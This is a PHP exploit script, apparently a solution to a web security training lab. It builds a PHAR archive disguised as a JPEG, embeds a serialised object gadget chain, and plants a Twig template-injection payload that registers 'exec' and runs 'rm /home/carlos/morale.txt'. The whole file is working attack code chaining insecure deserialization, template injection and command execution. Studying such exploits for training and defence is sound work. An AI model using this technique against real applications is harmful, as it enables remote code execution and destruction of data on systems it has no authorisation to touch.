<?php

function generatePHAR($object){
    @unlink('temp.tar.phar');
    $phar = new Phar('temp.tar.phar');
    $phar->startBuffering();
    $phar->addFromString("test.txt", "test");
    $phar->setStub("<?php __HALT_COMPILER(); ?>");
    $phar->setMetadata($object);
    $phar->stopBuffering();
    $pharContent = file_get_contents('temp.tar.phar');
    @unlink('temp.tar.phar');
    return $pharContent;
}

function generateJPEG($pharContent, $inJpegName, $outJpegName){
    $jpeg = file_get_contents($inJpegName);
    $pharContent = substr($pharContent, 6);
    $len = strlen($pharContent) + 2;
    $new = substr($jpeg, 0, 2) . "\xff\xfe" . chr(($len >> 8) & 0xff) . chr($len & 0xff) . $pharContent . substr($jpeg, 2);
    $contents = substr($new, 0, 148) . "        " . substr($new, 156);
    $chksum = 0;
    for ($i=0; $i<512; $i++){
        $chksum += ord(substr($contents, $i, 1));
    }
    $oct = sprintf("%07o", $chksum);
    $contents = substr($contents, 0, 148) . $oct . substr($contents, 155);
    @unlink($outJpegName);
    file_put_contents($outJpegName, $contents);
}


#############################################################
class Blog {
    public $user;
    public $desc;
    private $twig;

    public function __construct($user, $desc) {
        $this->user = $user;
        $this->desc = $desc;
    }
}

class CustomTemplate {
    private $template_file_path;

    public function __construct($template_file_path) {
        $this->template_file_path = $template_file_path;
    }
}

#############################################################


$object = new CustomTemplate(new Blog('asd', '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}'));
$inJpegName = '/home/setron/in.jpg';
$outJpegName = '/home/setron/out2.jpg';

generateJPEG(generatePHAR($object), $inJpegName, $outJpegName);

?>